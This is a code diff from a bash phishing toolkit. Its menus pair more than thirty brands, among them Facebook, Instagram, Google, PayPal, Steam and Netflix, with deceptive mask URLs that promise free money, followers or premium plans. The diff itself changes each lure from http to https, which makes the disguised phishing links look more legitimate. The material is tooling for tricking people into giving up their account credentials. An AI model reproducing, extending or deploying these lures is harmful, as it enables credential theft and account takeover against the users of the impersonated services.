@@ -480,19 +480,19 @@ site_facebook() {
 	case $REPLY in 
 		1 | 01)
 			website="facebook"
-			mask='http://blue-verified-badge-for-facebook-free'
+			mask='https://blue-verified-badge-for-facebook-free'
 			tunnel_menu;;
 		2 | 02)
 			website="fb_advanced"
-			mask='http://vote-for-the-best-social-media'
+			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		3 | 03)
 			website="fb_security"
-			mask='http://make-your-facebook-secured-and-free-from-hackers'
+			mask='https://make-your-facebook-secured-and-free-from-hackers'
 			tunnel_menu;;
 		4 | 04)
 			website="fb_messenger"
-			mask='http://get-messenger-premium-features-free'
+			mask='https://get-messenger-premium-features-free'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -516,19 +516,19 @@ site_instagram() {
 	case $REPLY in 
 		1 | 01)
 			website="instagram"
-			mask='http://get-unlimited-followers-for-instagram'
+			mask='https://get-unlimited-followers-for-instagram'
 			tunnel_menu;;
 		2 | 02)
 			website="ig_followers"
-			mask='http://get-unlimited-followers-for-instagram'
+			mask='https://get-unlimited-followers-for-instagram'
 			tunnel_menu;;
 		3 | 03)
 			website="insta_followers"
-			mask='http://get-1000-followers-for-instagram'
+			mask='https://get-1000-followers-for-instagram'
 			tunnel_menu;;
 		4 | 04)
 			website="ig_verify"
-			mask='http://blue-badge-verify-for-instagram-free'
+			mask='https://blue-badge-verify-for-instagram-free'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -551,15 +551,15 @@ site_gmail() {
 	case $REPLY in 
 		1 | 01)
 			website="google"
-			mask='http://get-unlimited-google-drive-free'
+			mask='https://get-unlimited-google-drive-free'
 			tunnel_menu;;		
 		2 | 02)
 			website="google_new"
-			mask='http://get-unlimited-google-drive-free'
+			mask='https://get-unlimited-google-drive-free'
 			tunnel_menu;;
 		3 | 03)
 			website="google_poll"
-			mask='http://vote-for-the-best-social-media'
+			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -581,11 +581,11 @@ site_vk() {
 	case $REPLY in 
 		1 | 01)
 			website="vk"
-			mask='http://vk-premium-real-method-2020'
+			mask='https://vk-premium-real-method-2020'
 			tunnel_menu;;
 		2 | 02)
 			website="vk_poll"
-			mask='http://vote-for-the-best-social-media'
+			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -626,121 +626,121 @@ main_menu() {
 			site_gmail;;
 		4 | 04)
 			website="microsoft"
-			mask='http://unlimited-onedrive-space-for-free'
+			mask='https://unlimited-onedrive-space-for-free'
 			tunnel_menu;;
 		5 | 05)
 			website="netflix"
-			mask='http://upgrade-your-netflix-plan-free'
+			mask='https://upgrade-your-netflix-plan-free'
 			tunnel_menu;;
 		6 | 06)
 			website="paypal"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		7 | 07)
 			website="steam"
-			mask='http://steam-500-usd-gift-card-free'
+			mask='https://steam-500-usd-gift-card-free'
 			tunnel_menu;;
 		8 | 08)
 			website="twitter"
-			mask='http://get-blue-badge-on-twitter-free'
+			mask='https://get-blue-badge-on-twitter-free'
 			tunnel_menu;;
 		9 | 09)
 			website="playstation"
-			mask='http://playstation-500-usd-gift-card-free'
+			mask='https://playstation-500-usd-gift-card-free'
 			tunnel_menu;;
 		10)
 			website="tiktok"
-			mask='http://tiktok-free-liker'
+			mask='https://tiktok-free-liker'
 			tunnel_menu;;
 		11)
 			website="twitch"
-			mask='http://unlimited-twitch-tv-user-for-free'
+			mask='https://unlimited-twitch-tv-user-for-free'
 			tunnel_menu;;
 		12)
 			website="pinterest"
-			mask='http://get-a-premium-plan-for-pinterest-free'
+			mask='https://get-a-premium-plan-for-pinterest-free'
 			tunnel_menu;;
 		13)
 			website="snapchat"
-			mask='http://view-locked-snapchat-accounts-secretly'
+			mask='https://view-locked-snapchat-accounts-secretly'
 			tunnel_menu;;
 		14)
 			website="linkedin"
-			mask='http://get-a-premium-plan-for-linkedin-free'
+			mask='https://get-a-premium-plan-for-linkedin-free'
 			tunnel_menu;;
 		15)
 			website="ebay"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		16)
 			website="quora"
-			mask='http://quora-premium-for-free'
+			mask='https://quora-premium-for-free'
 			tunnel_menu;;
 		17)
 			website="protonmail"
-			mask='http://protonmail-pro-basics-for-free'
+			mask='https://protonmail-pro-basics-for-free'
 			tunnel_menu;;
 		18)
 			website="spotify"
-			mask='http://convert-your-account-to-spotify-premium'
+			mask='https://convert-your-account-to-spotify-premium'
 			tunnel_menu;;
 		19)
 			website="reddit"
-			mask='http://reddit-official-verified-member-badge'
+			mask='https://reddit-official-verified-member-badge'
 			tunnel_menu;;
 		20)
 			website="adobe"
-			mask='http://get-adobe-lifetime-pro-membership-free'
+			mask='https://get-adobe-lifetime-pro-membership-free'
 			tunnel_menu;;
 		21)
 			website="deviantart"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		22)
 			website="badoo"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		23)
 			website="origin"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		24)
 			website="dropbox"
-			mask='http://get-1TB-cloud-storage-free'
+			mask='https://get-1TB-cloud-storage-free'
 			tunnel_menu;;
 		25)
 			website="yahoo"
-			mask='http://grab-mail-from-anyother-yahoo-account-free'
+			mask='https://grab-mail-from-anyother-yahoo-account-free'
 			tunnel_menu;;
 		26)
 			website="wordpress"
-			mask='http://unlimited-wordpress-traffic-free'
+			mask='https://unlimited-wordpress-traffic-free'
 			tunnel_menu;;
 		27)
 			website="yandex"
-			mask='http://grab-mail-from-anyother-yandex-account-free'
+			mask='https://grab-mail-from-anyother-yandex-account-free'
 			tunnel_menu;;
 		28)
 			website="stackoverflow"
-			mask='http://get-stackoverflow-lifetime-pro-membership-free'
+			mask='https://get-stackoverflow-lifetime-pro-membership-free'
 			tunnel_menu;;
 		29)
 			site_vk;;
 		30)
 			website="xbox"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		31)
 			website="mediafire"
-			mask='http://get-1TB-on-mediafire-free'
+			mask='https://get-1TB-on-mediafire-free'
 			tunnel_menu;;
 		32)
 			website="gitlab"
-			mask='http://get-1k-followers-on-gitlab-free'
+			mask='https://get-1k-followers-on-gitlab-free'
 			tunnel_menu;;
 		33)
 			website="github"
-			mask='http://get-1k-followers-on-github-free'
+			mask='https://get-1k-followers-on-github-free'
 			tunnel_menu;;
 		99)
 			about;;
